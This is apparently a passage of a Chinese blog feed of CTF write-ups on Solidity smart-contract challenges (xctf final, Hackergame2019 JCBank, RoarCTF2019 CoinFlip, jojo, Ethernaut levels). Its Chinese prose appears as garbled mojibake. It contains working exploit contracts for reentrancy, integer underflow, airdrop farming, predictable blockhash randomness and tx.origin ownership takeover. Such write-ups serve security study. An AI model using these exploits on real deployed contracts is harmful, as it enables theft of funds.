memory[0x40:0x60] - temp2]); memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; var temp3 = keccak256(memory[0x00:0x40]); storage[temp3] = storage[temp3] - 0x01;&#125; ÂàÜÊûê ÈÄöËøá‰∏äÈù¢ÁöÑÂàÜÊûêÂêéÔºåËøôÊ†∑Êï¥‰∏™ÊîªÂáªÈìæÂ∞±Âá∫Êù•‰∫Ü ÁîüÊàêÁ¨¶ÂêàË¶ÅÊ±ÇÁöÑÂ§ñÈÉ®Ë¥¶Êà∑ÔºåÂú® constructor ‰∏≠Ë∞ÉÁî® gift() Ë∞ÉÁî® 0x23de8635 func_06CE ÔºåËøôÈáåË¶ÅÂà©Áî® bytecode ÁöÑÊñπÂºèÈÉ®ÁΩ≤ÔºåÂõ†‰∏∫Êàë‰ª¨‰∏çÁü•ÈÅì func_06CE ‰∏≠Ë∞ÉÁî®ÁöÑÊé•Âè£ÂáΩÊï∞ 0xa8286aca ÁöÑÂáΩÊï∞ÂêçÔºåÊâÄ‰ª•Âà©Áî® bytecode ÁöÑÊñπÂºèÈÉ®ÁΩ≤Á¨¨‰∏âÊñπÂêàÁ∫¶ÔºåÂ∞Ü fake(uint256) ÂØπÂ∫îÁöÑÂáΩÊï∞ÈÄâÊã© id Êîπ‰∏∫ 0xa8286aca Âç≥ÂèØÔºåËøôÊ†∑Ë∞ÉÁî® 0xa8286aca Â∞±ÊòØË∞ÉÁî®Êàë‰ª¨ÈáçÂÜô‰πãÂêéÁöÑ 0xa8286aca ‰∫ÜÔºåÁî® bytecode ÈÉ®ÁΩ≤ÂèØ‰ª•Áî®Âú®Á∫øÁöÑ myetherwallet.com Ë∞ÉÁî® guess() ÔºåÁÑ∂ÂêéË∞ÉÁî® buy() Ë∞ÉÁî® retract() Âíå revise() ‰øÆÊîπ owner ÈÉ®ÁΩ≤Á¨¨‰∏âÊñπÂ≠êÂêàÁ∫¶ÔºåÁ¨¨‰∏âÊñπÂ≠êÂêàÁ∫¶Ë∞ÉÁî® gift() Âíå transfer() ÁªôÊîªÂáªÂêàÁ∫¶ËΩ¨Ë¥¶ÔºåÁÑ∂ÂêéË∞ÉÁî® withdraw() ËøõË°åÈáçÂÖ•ÊîªÂáª ÊúÄÂêéË∞ÉÁî® payforflag Âç≥ÂèØ exp Â§ñÈÉ®Ë¥¶Êà∑Êª°Ë∂≥ÂÖ∂ÈÉ®ÁΩ≤ÁöÑÁ¨¨‰∏Ä‰∏™ÂêàÁ∫¶Âú∞ÂùÄÊúÄÂêé 12 ‰ΩçÊòØ 0x111 ÂèØ‰ª•Áî®‰∏ãËø∞ËÑöÊú¨ÁîüÊàêÔºågenerate_eoa1() ÊòØÁîüÊàêÂ§ñÈÉ®Ë¥¶Êà∑ÊúÄÂêé 12 ‰Ωç‰∏∫ 0x111 Ôºågenerate_eoa2() ÊòØÁîüÊàêÊª°Ë∂≥Â§ñÈÉ®Ë¥¶Êà∑ÈÉ®ÁΩ≤ÁöÑÁ¨¨‰∏Ä‰∏™ÂêàÁ∫¶ÊúÄÂêé 12 ‰ΩçÊòØ 0x111 ÔºåÊàë‰ª¨Áî® generate_eoa2() Âç≥ÂèØ 1234567891011121314151617181920212223242526272829303132333435from ethereum import utilsimport os, sys# generate EOA with appendix 1b1bdef generate_eoa1(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not addr.lower().endswith("111"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))# generate EOA with the ability to deploy contract with appendix 1b1bdef generate_eoa2(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith("111"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))if __name__ == "__main__": if sys.argv[1] == "1": generate_eoa1() elif sys.argv[1] == "2": generate_eoa2() else: print("Please enter valid argument") expÂ¶Ç‰∏ã 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172pragma solidity ^0.4.23;contract hack &#123; address instance_address = 0x168892cb672a747f193eb4aca7b964bfb0aa6476; uint have_withdraw = 0; int cnt = 0; constructor() payable &#123; // gift() address(instance_address).call(bytes4(0x24b04905)); &#125; function step1() public &#123; // storage[0x02] == 1 address(instance_address).call(bytes4(0x23de8635), 0); &#125; function fake(uint256 _i) public returns(uint256) &#123; if(cnt == 1) &#123; return 1; &#125; cnt = 1; return 0; &#125; function step2() public &#123; // guess(uint256) uint256 v = uint256(block.blockhash(block.number-1)) % 3; address(instance_address).call(bytes4(0x9189fec1), v); // buy() address(instance_address).call(bytes4(0xa6f2ae3a)); &#125; function step3() public &#123; // retract() assert(address(instance_address).call(bytes4(0x47f57b32))); &#125; function step4() public &#123; // revise(uint256,bytes32) uint256 solt = 2**256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6; address(instance_address).call(bytes4(0x0339f300), solt, 2**160 + uint256(address(this))); &#125; function step5() public &#123; // withdraw address(instance_address).call(bytes4(0x2e1a7d4d), 100); &#125; function() payable &#123; if (have_withdraw &lt;=2 &amp;&amp; msg.sender == instance_address) &#123; have_withdraw += 1; address(instance_address).call(bytes4(0x2e1a7d4d), 100); &#125; &#125; function step6(string b64email) public &#123; address(instance_address).call(bytes4(0x6bc344bc), b64email); &#125;&#125;contract son &#123; address instance_address = 0x168892cb672a747f193eb4aca7b964bfb0aa6476; constructor() payable &#123; // gift() address(instance_address).call(bytes4(0x24b04905)); // transfer address(instance_address).call(bytes4(0xa9059cbb), address(0x2db8f907965a5742f16f82cddced585f8bc04111), 100); &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>xctf final</tag>
        <tag>Happy_DOuble_Eleven</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hackergame2019 JCBank]]></title>
    <url>%2F2019%2FJCBank%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä ‰ª•Â§™Âùä Kovan ÊµãËØïÈìæ ÂêàÁ∫¶Âú∞ÂùÄÔºöhttps://kovan.etherscan.io/address/0xE575c9abD35Fa94F1949f7d559056bB66FddEB51 È¢òÁõÆÔºöhttps://github.com/hitcxy/challenges/tree/master/2019/Hackergame2019_JCBank ‰∏§‰∏™ flag : get_flag_1 get_flag_2 get_flag_1 ËØªÂèñ storage ÂèòÈáè secret ÁöÑÂÄºÂç≥ÂèØÔºåÂÖ∂ÂÄº‰∏∫ 0x175bddc0da1bd47369c47861f48c8ac ÔºåË∞ÉÁî® get_flag_1 Âç≥ÂèØ 1234567891011var Web3=require("web3");if (typeof web3 !== 'undefined') &#123; web3 = new Web3(web3.currentProvider);&#125; else &#123; web3 = new Web3(new Web3.providers.HttpProvider("https://kovan.infura.io/v3/b38f10b5036f4e6691fcc690461097d1"));&#125;var address="0xE575c9abD35Fa94F1949f7d559056bB66FddEB51";web3.eth.getStorageAt(address, 0, function(x,y)&#123;console.info(y)&#125;);web3.eth.getStorageAt(address, 1, function(x,y)&#123;console.info(y)&#125;);web3.eth.getStorageAt(address, 2, function(x,y)&#123;console.info(y)&#125;); get_flag_2 Âà©Áî® Reentrancy Âíå Êï¥Âûã‰∏ãÊ∫¢ 123456789101112131415161718192021222324252627282930313233contract hack &#123; address instance_address = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51; JCBank target = JCBank(instance_address); uint public have_withdraw = 0; string public s; constructor() public payable &#123;&#125; function attack() public &#123; target.deposit.value(0.1 ether)(); &#125; function attack1(uint128 guess) public &#123; s=target.get_flag_1(guess); &#125; function attack2() public &#123; if(have_withdraw == 1)&#123; target.get_flag_2(155418233698); &#125; &#125; function attack3() public &#123; target.withdraw(0.1 ether); &#125; function() payable &#123; if (have_withdraw == 0 &amp;&amp; msg.sender == instance_address)&#123; have_withdraw = 1; target.withdraw(0.1 ether); &#125; &#125;&#125; attack Â≠òÂÖ•‰∏ÄÁÇπÈáëÈ¢ùÔºåattack3 ÈáçÂÖ•ÊîªÂáª‰∏§Ê¨°Ôºå attack2 Ë∞ÉÁî® get_flag_2 Âç≥ÂèØ]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Hackergame</tag>
        <tag>JCBank</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RoarCTF2019 CoinFlip]]></title>
    <url>%2F2019%2FCoinFlip%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä RoarCTF2019 ÁöÑ CoinFlip È¢òÁõÆ È¢òÁõÆÔºöhttps://github.com/hitcxy/challenges/tree/master/2019/RoarCTF2019_CoinFlip Deposit() ÂèØ‰ª•Â¢ûÂä† balances[msg.sender] Ôºå‰ΩÜÊòØÈúÄË¶ÅÂèëÈÄÅ msg.value &gt; 500 ether ÊâçËÉΩÊª°Ë∂≥Ë¶ÅÊ±ÇÔºåÂèØ‰ª•ÂÜôËá™Âä®ÂåñËÑöÊú¨ÂÆåÊàêÔºà‰ΩÜËøôÊ†∑ÁöÑËØùÔºåÈ¢òÁõÆÂ∫îËØ•ÊòØÈùûÈ¢ÑÊúüÔºåÈ¢òÁõÆËÄÉÁÇπÂ∫îËØ•‰∏çÊòØËøô‰∏™ÔºåÊâÄ‰ª•ÁêÜËÆ∫ÂèØË°åÔºåËØ∑Ëá™Ë°åÂ∞ùËØïÔºâ ËñÖÁæäÊØõÊîªÂáª: ÈÉ®ÁΩ≤Á¨¨‰∏âÊñπËá™ÂêàÁ∫¶ÔºåÁÑ∂ÂêéË∞ÉÁî® Ap() Âíå Transfer() Â∞ÜÈí±ËΩ¨Âà∞Âõ∫ÂÆöÂú∞ÂùÄ Âõ∫ÂÆöÂú∞ÂùÄË∞ÉÁî® CaptureTheFlag Âç≥ÂèØ 12345678910111213141516171819202122232425contract hack &#123; address instance_address = 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21; P_Bank target = P_Bank(instance_address); function hack1(string b64email) public &#123; target.CaptureTheFlag(b64email); &#125;&#125;contract father &#123; function createsons() &#123; for (uint i=0;i&lt;101;i++) &#123; son ason = new son(); &#125; &#125;&#125;contract son &#123; constructor() public &#123; P_Bank tmp = P_Bank(0xF60ADeF7812214eBC746309ccb590A5dBd70fc21); tmp.Ap(); tmp.Transfer(0x7ec9f720a8d59bc202490c690139f8c7cbad568d, 1 ether); &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>RoarCTF2019</tag>
        <tag>CoinFlip</tag>
        <tag>Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Êï∞Â≠óÁªèÊµé2019 jojo]]></title>
    <url>%2F2019%2Fjojo%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Êï∞Â≠óÁªèÊµé‰∫ëÂÆâÂÖ®‰ºóÊµãÂ§ßËµõ 2019 Ôºå‰∏ÄÈÅìÂå∫ÂùóÈìæÈ¢òÁõÆ È¢òÁõÆÔºöhttps://github.com/hitcxy/challenges/tree/master/2019/szjj_jojo ÈúÄË¶ÅÈÄÜÂêë Êª°Ë∂≥ require Âç≥ÂèØ 1234function payforflag(string b64email) public &#123; require(balanceOf[msg.sender] &gt;= 100000); emit SendFlag(b64email);&#125; gift Á©∫ÊäïÂáΩÊï∞ 12345function gift() public &#123; assert(gift[msg.sender]==0); balanceOf[msg.sender]+=100; gift[msg.sender]=1;&#125; ËΩ¨Ë¥¶ÂáΩÊï∞ 12345function transfer(address to,uint value) public &#123; assert(balanceOf[msg.sender] &gt;= value); balanceOf[msg.sender]-=value; balanceOf[to]+=value;&#125; ËΩ¨Ë¥¶ÂáΩÊï∞Êó†Ê≥ïÊï¥ÂûãÊ∫¢Âá∫ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂè¶ÊÉ≥ÂäûÊ≥ï ËñÖÁæäÊØõÊîªÂáªÔºöÈÄöËøáÂª∫Á´ãÂ§ö‰∏™Ëá™ÂêàÁ∫¶È¢ÜÂèñÁ©∫ÊäïÔºåÁÑ∂ÂêéËΩ¨Ë¥¶ÁªôÂõ∫ÂÆöË¥¶Êà∑Âç≥ÂèØÂÆåÊàêÊîªÂáª payforflag 12345678910111213141516171819202122232425contract hack &#123; address instance_address = 0xd86ed76112295a07c675974995b9805912282eb3; jojo target = jojo(instance_address); function hack1(string b64email) public &#123; target.payforflag(b64email); &#125;&#125;contract father &#123; function attack() public &#123; for (uint i=0; i&lt;50; i++) &#123; son ason = new son(); &#125; &#125;&#125;contract son &#123; constructor() public&#123; jojo tmp = jojo(0xd86ed76112295a07c675974995b9805912282eb3); tmp.gift(); tmp.transfer(0xafFE1Eeea46Ec23a87C7894d90Aa714552468cAF,100); &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Solidity</tag>
        <tag>Smart Contract</tag>
        <tag>Êï∞Â≠óÁªèÊµé‰∫ëÂÆâÂÖ®</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ethernaut -- Smart Contract]]></title>
    <url>%2F2019%2Fethernaut%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä 22 shop ËøôÈ¢òË≤å‰ººÂ∑≤Áªè‰∏ãÁ∫øÔºåÂò§Âò§Âò§Âò§ ‰ª•‰∏ã wp ÈÉΩÊòØÂü∫‰∫é 0.4.* ÁâàÊú¨ÁöÑ ËÆ∞ÂΩï‰∏Ä‰∏ãÂàöÂ≠¶‰π† Smart Contract ÂÅöÈ¢òÁöÑÂπ≥Âè∞ÁöÑ WP Ôºà2333ÂÖ•Èó®Á∫ßÔºåÂºÄÂøÉÂ∞±Â•ΩÔΩûÔΩûÔΩûÔºâÔºåÂ¶ÇÊûúÊ≤°Êúâ‰ªª‰ΩïÂü∫Á°ÄÔºåÂèØ‰ª•ÂèÇËÄÉ CryptoZombies Á≠âÊïôÁ®ãÔºå‰∏ãÈù¢ÊòØÈ¢òÁõÆÂπ≥Âè∞Âú∞ÂùÄÔºö https://ethernaut.openzeppelin.com/ Hello Ethernaut ÁÜüÊÇâÂÖ≥Âç°ÊåëÊàòÁöÑÊ®°ÂºèÔºå‰ª•ÂèäÊâßË°åÊìç‰ΩúÁöÑÊñπÂºèÔºåÊ†πÊçÆÂÖ∂‰ªãÁªç‰∏ÄÊ≠•‰∏ÄÊ≠•Êìç‰ΩúÂç≥ÂèØ Áî±‰∫éÁΩëÁªú‰∏çÂ§™Á®≥ÂÆöÁöÑÂéüÂõ†ÔºåÂèØ‰ª•Â§öËØïÂá†Ê¨°ÔºåÊàêÂäüÁöÑÁªìÊûúËä±ÈáåËÉ°Âì®ÁöÑ23333 FallbackRequire you claim ownership of the contract you reduce its balance to 0 Source1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Fallback is Ownable &#123; using SafeMath for uint256; mapping(address =&gt; uint) public contributions; function Fallback() public &#123; contributions[msg.sender] = 1000 * (1 ether); &#125; function contribute() public payable &#123; require(msg.value &lt; 0.001 ether); contributions[msg.sender] = contributions[msg.sender].add(msg.value); if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; owner.transfer(this.balance); &#125; function() payable public &#123; require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; Analyse ÂêàÁ∫¶ÂèØ‰ª•Êúâ‰∏Ä‰∏™Êú™ÂëΩÂêçÁöÑÂáΩÊï∞„ÄÇËøô‰∏™ÂáΩÊï∞‰∏çËÉΩÊúâÂèÇÊï∞‰πü‰∏çËÉΩÊúâËøîÂõûÂÄº„ÄÇ Â¶ÇÊûúÂú®‰∏Ä‰∏™Âà∞ÂêàÁ∫¶ÁöÑË∞ÉÁî®‰∏≠ÔºåÊ≤°ÊúâÂÖ∂‰ªñÂáΩÊï∞‰∏éÁªôÂÆöÁöÑÂáΩÊï∞Ê†áËØÜÂåπÈÖçÔºàÊàñÊ≤°ÊúâÊèê‰æõË∞ÉÁî®Êï∞ÊçÆÔºâÔºåÈÇ£‰πàËøô‰∏™ÂáΩÊï∞Ôºà fallback ÂáΩÊï∞Ôºâ‰ºöË¢´ÊâßË°å„ÄÇÈô§Ê≠§‰πãÂ§ñÔºåÊØèÂΩìÂêàÁ∫¶Êî∂Âà∞‰ª•Â§™Â∏ÅÔºàÊ≤°Êúâ‰ªª‰ΩïÊï∞ÊçÆÔºâÔºåËøô‰∏™ÂáΩÊï∞Â∞±‰ºöÊâßË°å„ÄÇÊ≠§Â§ñÔºå‰∏∫‰∫ÜÊé•Êî∂‰ª•Â§™Â∏ÅÔºå fallback ÂáΩÊï∞ÂøÖÈ°ªÊ†áËÆ∞‰∏∫ payable „ÄÇ ÂæàÊòéÊòæÊàë‰ª¨Â¶ÇÊûúÈÄöËøáÂèçÂ§çË∞ÉÁî® contribute Êù•Ëß¶Âèë owner ‰∏çÁé∞ÂÆûÔºåÂõ†‰∏∫Êàë‰ª¨ÊØèÊ¨°ÊúÄÂ§öÂêëÂêàÁ∫¶Ë¥°ÁåÆ‰∏çÂ§ß‰∫é 0.001 ether ÔºåËÄåË¶ÅË∂ÖËøá owner ÈúÄË¶Å 1000 ether ÔºàÊûÑÈÄ†ÂáΩÊï∞Ëµã‰∫à owner ÁöÑÔºâ„ÄÇ‰ΩÜÊàë‰ª¨ÊÉäÂñúÂú∞ÂèëÁé∞ fallback ÂáΩÊï∞ÂêåÊ†∑ÂèØ‰ª•ÊîπÂèò owner ÁöÑÂÄºÔºåÈÇ£‰πàÂØπÂ∫îÁöÑÊìç‰ΩúÂ∞±ÈùûÂ∏∏Ê∏ÖÊô∞‰∫ÜÔºö Ë∞ÉÁî®ÂêàÁ∫¶ÁöÑ contribute ‰ΩøÂæóÂêàÁ∫¶‰∏≠Êàë‰ª¨Ë¥¶Êà∑ÂØπÂ∫îÁöÑ balance Â§ß‰∫é 0 Ëß¶Âèë fallback ÂáΩÊï∞‰ΩøÂæóÂêàÁ∫¶ÂØπÂ∫îÁöÑ owner ÂèòÊàêÊàë‰ª¨ Ë∞ÉÁî® withdraw ÂáΩÊï∞Ê∏ÖÁ©∫ balance Solution12345678// step 1await contract.contribute(&#123;value: 1&#125;);// step 2Ôºå‰ΩøÁî® sendTransaction ÂáΩÊï∞Ëß¶Âèë fallback ÂáΩÊï∞ÊâßË°åawait contract.sendTransaction(&#123;value: 1&#125;);// step 3await contract.withdraw();// Ê≠§Êó∂Ë∞ÉÁî® owner ÂáΩÊï∞ÂèØ‰ª•Á°ÆËÆ§ÂêàÁ∫¶ÁöÑ owner ÊòØÂê¶Â∑≤ÁªèÂèòÊàê‰∫ÜÊàë‰ª¨ÊâÄÂØπÂ∫îÁöÑÂú∞ÂùÄ‰∫Üawait contract.owner(); FalloutRequire Claim ownership of the contract below to complete this level. Source123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Fallout is Ownable &#123; using SafeMath for uint256; mapping (address =&gt; uint) allocations; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; function allocate() public payable &#123; allocations[msg.sender] = allocations[msg.sender].add(msg.value); &#125; function sendAllocation(address allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(this.balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; Analyse Êàë‰ª¨ÂèØ‰ª•ÂèëÁé∞‰∏Ä‰∏™ÂæàÊòéÊòæÁöÑÈóÆÈ¢òÔºåÁêÜËÆ∫‰∏äÂ∫îËØ•ÂÜôÊàê Fallout ÁöÑÊûÑÈÄ†ÂáΩÊï∞Ë¢´ÂÜôÊàê‰∫Ü Fal1out ÔºåÈÇ£‰πàËØ•ÂáΩÊï∞Â∞±‰∏çÊòØÊûÑÈÄ†ÂáΩÊï∞ÔºåÊÑèÂë≥ÁùÄËØ•ÂáΩÊï∞ÂèØ‰ª•Ë¢´Êàë‰ª¨Ë∞ÉÁî®ÔºàÊàë‰ª¨Êó†Ê≥ïË∞ÉÁî®ÊûÑÈÄ†ÂáΩÊï∞Ôºâ„ÄÇ Solution1234// Ë∞ÉÁî®ËØ•ÂáΩÊï∞Ôºå‰øÆÊîπ ownerawait contract.Fal1out();// ÂèØ‰ª•Á°ÆËÆ§ÊòØÂê¶‰øÆÊîπÊàêÂäüawait contract.owner(); Coin FlipRequire This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you&#39;ll need to use your psychic abilities to guess the correct outcome 10 times in a row. Source1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.18;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract CoinFlip &#123; using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number.sub(1))); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125; Analyse ‰ª£Á†ÅÂ§ÑÁêÜÊµÅÁ®ã‰∏∫Ôºö Ëé∑Âæó‰∏ä‰∏ÄÂùóÁöÑ hash ÂÄº Âà§Êñ≠‰∏é‰πãÂâç‰øùÂ≠òÁöÑ hash ÂÄºÊòØÂê¶Áõ∏Á≠âÔºåÁõ∏Á≠âÂàô‰ºöÈÄÄ Ê†πÊçÆ blockValue/FACTOR ÁöÑÂÄºÂà§Êñ≠‰∏∫Ê≠£ÊàñË¥üÔºåÂç≥ÈÄöËøá hash ÁöÑÈ¶ñ‰ΩçÂà§Êñ≠ ‰ª•Â§™ÂùäÂå∫ÂùóÈìæ‰∏äÁöÑÊâÄÊúâ‰∫§ÊòìÈÉΩÊòØÁ°ÆÂÆöÊÄßÁöÑÁä∂ÊÄÅËΩ¨Êç¢Êìç‰ΩúÔºåÊØèÁ¨î‰∫§ÊòìÈÉΩ‰ºöÊîπÂèò‰ª•Â§™ÂùäÁîüÊÄÅÁ≥ªÁªüÁöÑÂÖ®ÁêÉÁä∂ÊÄÅÔºåÂπ∂‰∏îÊòØ‰ª•‰∏ÄÁßçÂèØËÆ°ÁÆóÁöÑÊñπÂºèËøõË°åÔºåËøôÊÑèÂë≥ÁùÄÂÖ∂Ê≤°Êúâ‰ªª‰ΩïÁöÑ‰∏çÁ°ÆÂÆöÊÄß„ÄÇÊâÄ‰ª•Âú®Âå∫ÂùóÈìæÁîüÊÄÅÁ≥ªÁªüÂÜÖÔºå‰∏çÂ≠òÂú®ÁÜµÊàñÈöèÊú∫ÊÄßÁöÑÊù•Ê∫ê„ÄÇÂ¶ÇÊûú‰ΩøÁî®ÂèØ‰ª•Ë¢´ÊåñÁüøÁöÑÁüøÂ∑•ÊâÄÊéßÂà∂ÁöÑÂèòÈáèÔºåÂ¶ÇÂå∫ÂùóÂìàÂ∏åÂÄºÔºåÊó∂Èó¥Êà≥ÔºåÂå∫ÂùóÈ´ò‰ΩéÊàñÊòØ Gas ‰∏äÈôêÁ≠â‰Ωú‰∏∫ÈöèÊú∫Êï∞ÁöÑÁÜµÊ∫êÔºå‰∫ßÁîüÁöÑÈöèÊú∫Êï∞Âπ∂‰∏çÂÆâÂÖ®„ÄÇ Solution12345678910111213141516171819202122232425262728293031323334353637383940414243444546pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125;contract hack&#123; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; address instance_address = 0x3205e72483e9568c0959384f9c13672c3566c4a1; CoinFlip c = CoinFlip(instance_address); function exploit() public &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; c.flip(side); &#125;&#125; Ë∞ÉÁî® 10 Ê¨° exploit() Âç≥ÂèØ TelephoneRequire Claim ownship of the contract below to complete this level Source12345678910111213141516pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; Analyse ËøôÈáåÂå∫ÂàÜ‰∏Ä‰∏ã tx.origin Âíå msg.sender Ôºåmsg.senderÊòØÂáΩÊï∞ÁöÑÁõ¥Êé•Ë∞ÉÁî®ÊñπÔºåÂú®Áî®Êà∑ÊâãÂä®Ë∞ÉÁî®ËØ•ÂáΩÊï∞Êó∂ÊòØÂèëËµ∑‰∫§ÊòìÁöÑË¥¶Êà∑Âú∞ÂùÄÔºå‰ΩÜ‰πüÂèØ‰ª•ÊòØË∞ÉÁî®ËØ•ÂáΩÊï∞ÁöÑ‰∏Ä‰∏™Êô∫ËÉΩÂêàÁ∫¶ÁöÑÂú∞ÂùÄ„ÄÇËÄå tx.origin ÂàôÂøÖÁÑ∂ÊòØËøô‰∏™‰∫§ÊòìÁöÑÂéüÂßãÂèëËµ∑ÊñπÔºåÊó†ËÆ∫‰∏≠Èó¥ÊúâÂ§öÂ∞ëÊ¨°ÂêàÁ∫¶ÂÜÖ/Ë∑®ÂêàÁ∫¶ÂáΩÊï∞Ë∞ÉÁî®ÔºåËÄå‰∏î‰∏ÄÂÆöÊòØË¥¶Êà∑Âú∞ÂùÄËÄå‰∏çÊòØÂêàÁ∫¶Âú∞ÂùÄ„ÄÇ ÁªôÂÆöËøôÊ†∑‰∏Ä‰∏™Âú∫ÊôØÂ¶ÇÔºöÁî®Êà∑ÈÄöËøá ÂêàÁ∫¶A Ë∞É ÂêàÁ∫¶B ÔºåÊ≠§Êó∂Ôºö ÂØπ‰∫é ÂêàÁ∫¶A Ôºötx.originÂíåmsg.senderÈÉΩÊòØÁî®Êà∑ ÂØπ‰∫é ÂêàÁ∫¶B Ôºötx.originÊòØÁî®Êà∑Ôºåmsg.senderÊòØ ÂêàÁ∫¶AÊâÄ‰ª•ÔºåËøôÈáåÈÉ®ÁΩ≤‰∏Ä‰∏™Á¨¨‰∏âÊñπÂêàÁ∫¶Âç≥ÂèØ„ÄÇ Solution12345678910111213141516171819202122232425pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125;contract hack &#123; address instance_address = 0x852cd04ec66730198e709eb4261d3fa926bc92d8; Telephone t = Telephone(instance_address); function exploit() public &#123; t.changeOwner(msg.sender); &#125;&#125; ÊîªÂáªËÄÖË∞ÉÁî® exploit() Âç≥ÂèØ TokenRequire The goal of this level is for you to hack the basic token contract below. You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens. Source12345678910111213141516171819202122pragma solidity ^0.4.18;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; function Token(uint _initialSupply) public &#123; balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; return balances[_owner]; &#125;&#125; Analyse ÁªèÂÖ∏ÁöÑÊï¥Êï∞Ê∫¢Âá∫ÈóÆÈ¢òÔºåÂú® transfer() ÂáΩÊï∞Á¨¨‰∏ÄË°å require ÈáåÔºåËøôÈáåÁöÑ balances Âíå value ÈÉΩÊòØ uint „ÄÇÊ≠§Êó∂ balances ‰∏∫ 20 Ôºå‰ª§ value=21 Ôºå‰∫ßÁîü‰∏ãÊ∫¢Ôºå‰ªéËÄåÁªïËøáÈ™åËØÅÔºåÂπ∂ËΩ¨Âá∫‰∏ÄÁ¨îÂæàÂ§ßÁöÑÈáëÈ¢ù„ÄÇ Solution1234// ËΩ¨ÁªôË∞Å‰∏çÈáçË¶ÅÔºåÂÖ≥ÈîÆÊòØÂà©Áî® 20-21 Ëß¶ÂèëÊï¥Êï∞‰∏ãÊ∫¢await contract.transfer(0, 21);// ÂèØ‰ª•Áúã‰∏Ä‰∏ãËá™Â∑±Áé∞Âú®ÁöÑ token ÊúâÂ§öÂ∞ëÔºàÈùûÂ∏∏‰πãÂ§öÔºâawait contract.balanceOf(player); 